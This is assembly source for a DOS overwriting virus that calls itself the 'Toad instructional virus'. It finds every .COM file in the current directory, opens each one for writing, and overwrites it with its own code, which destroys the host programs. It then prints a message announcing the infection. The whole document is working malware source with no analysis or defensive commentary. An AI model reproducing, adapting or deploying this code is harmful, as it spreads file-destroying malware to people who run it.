   code    segment
           assume  cs:code,ds:code
           org     100h
   toad    proc    near

   first_fly:
         mov     ah,4eh
   find_fly:
           xor     cx,cx
           lea     dx,comsig
           int     21h
           jc      wart_growth

   open_fly:
           mov     ax,3d02h
           mov     dx,9eh
           int     21h

   eat_fly:
           xchg    bx,ax
           mov     ah,40h
           mov     cx,offset horny - offset first_fly
           lea     dx,first_fly
           int     21h

   stitch_up:
           mov     ah,3eh
           int     21h
         mov     ah,4fh
         jmp     find_fly

   wart_growth:
         mov     ah,09h
         mov     dx,offset wart
         int     21h

   cya:    int     20h


   comsig  db      "*.com",0
   wart    db      'Congratulations! You have infected all the COM files in this ',10,13

         db      'directory with the Toad instructional virus. Have a nice day.',10,13,'$'
   horny   label   near
   toad    endp
   code    ends
           end     first_fly


